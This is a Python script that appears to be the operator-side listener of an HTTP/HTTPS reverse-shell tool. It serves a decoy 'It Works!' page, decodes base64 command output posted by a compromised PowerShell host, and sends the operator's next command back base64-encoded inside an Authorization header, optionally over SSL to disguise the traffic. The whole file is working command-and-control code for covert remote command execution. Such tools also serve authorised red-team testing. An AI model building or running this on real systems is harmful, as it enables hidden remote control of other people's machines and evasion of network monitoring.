#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from termcolor import colored
import urllib.parse
import time
import readline
import ssl
import argparse


"""
    For HTTPS Server
        Create certificate using the commands:
            - openssl genrsa -out private.pem 2048
            - openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
"""


class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        self.send_response(200)
        content_len = int(self.headers.get('content-length', 0))
        test_data = self.rfile.read(content_len)
        result = (test_data[7:]).decode('utf-8')

        try:
            result = urllib.parse.unquote(result)
            result = (base64.b64decode(result)).decode('utf-8')
        except:
            print ("no base 64 result: {}".format(result))

        result=result.split('_n1w_')
        if result[0] == "":
            del result[0]
        pwd = result[-1].strip()
        del result[-1] # Deleting pwd from result

        for string in result:
            print(colored(string, 'blue'))

        command = input("PS {}>> ".format(pwd)) + "; pwd"
        CMD = base64.b64encode(command.encode())
        self.send_header('Authorization',CMD.decode('utf-8'))
        self.end_headers()
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return


def main():

    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                         By: 3v4Si0N
    """
    print (colored(banner, 'yellow'))
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    args = parser.parse_args()

    try:
        HOST = args.host
        PORT = args.port
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))

        if (args.ssl):
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        server.serve_forever()

    except KeyboardInterrupt:
        print (' received, shutting down the web server')
        server.socket.close()

main()
